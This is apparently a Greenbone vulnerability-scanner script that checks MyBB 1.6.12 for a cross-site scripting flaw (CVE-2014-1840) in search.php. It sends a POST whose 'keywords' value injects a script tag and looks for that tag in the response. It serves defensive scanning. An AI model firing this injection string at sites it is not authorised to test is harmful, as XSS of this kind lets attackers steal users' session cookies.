# SPDX-FileCopyrightText: 2014 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:mybb:mybb";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.804234");
  script_version("2025-09-05T15:40:40+0000");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"2025-09-05 15:40:40 +0000 (Fri, 05 Sep 2025)");
  script_tag(name:"creation_date", value:"2014-02-05 15:23:57 +0530 (Wed, 05 Feb 2014)");

  script_cve_id("CVE-2014-1840");

  script_tag(name:"qod_type", value:"remote_analysis");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("MyBB 1.6.12 XSS Vulnerability");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2014 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("sw_mybb_http_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("mybb/http/detected");

  script_tag(name:"summary", value:"MyBB is prone to a cross-site scripting (XSS) vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted exploit string via HTTP POST request and check
  whether it is able to read the string or not.");

  script_tag(name:"insight", value:"The flaw is due to an input passed via the 'keywords' parameter
  to 'search.php', which is not properly sanitised before using it.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to steal the
  victim's cookie-based authentication credentials.");

  script_tag(name:"affected", value:"MyBB version 1.6.12. Other versions may also be affected.");

  script_tag(name:"solution", value:"Update to version 1.6.13 or later.");

  script_xref(name:"URL", value:"http://exploitsdownload.com/exploit/na/mybb-1612-post-cross-site-scripting");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/65344");
  script_xref(name:"URL", value:"http://osandamalith.wordpress.com/2014/02/02/mybb-1-6-12-post-xss-0day/");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

url = dir + "/search.php";
payload = "action=do_search&keywords=qor'";
payload += '("<script>alert(/1234567890/)</script>';

req = http_post(item:url, port:port, data:payload);
res = http_send_recv(port:port, data:req);

if(res =~ "^HTTP/1\.[01] 200" && "<script>alert(/1234567890/)</script>" >< res){
  report = http_report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
}

exit(0);
